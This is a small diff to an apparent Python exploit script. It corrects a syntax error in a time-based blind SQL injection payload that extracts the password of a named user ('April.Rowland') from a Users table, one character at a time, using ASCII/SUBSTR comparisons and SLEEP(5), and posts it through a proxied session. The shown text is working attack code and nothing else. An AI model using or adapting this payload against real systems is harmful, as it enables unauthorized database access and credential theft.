@@ -64,7 +64,7 @@ def sendPayload(pos2):
 
         if (var1==0):
             # If not middle, checks to see if value is less than middle
-            payload = "test'+OR+1%3d1+AND(+SELECT+ASCII(SUBSTR(password,"+str(pos2)+",1))+FROM+Users+WHERE+Username_field%3d'April.Rowland')%3c"+str(numList([middle])+"-SLEEP(5)+%%3b%23"
+            payload = "test'+OR+1%3d1+AND(+SELECT+ASCII(SUBSTR(password,"+str(pos2)+",1))+FROM+Users+WHERE+Username_field%3d'April.Rowland')%3c"+str(numList[middle])+"-SLEEP(5)+%%3b%23"
             r = session.post(url, headers=headers, data=payload, proxies=proxies)
 
             if r.ok:
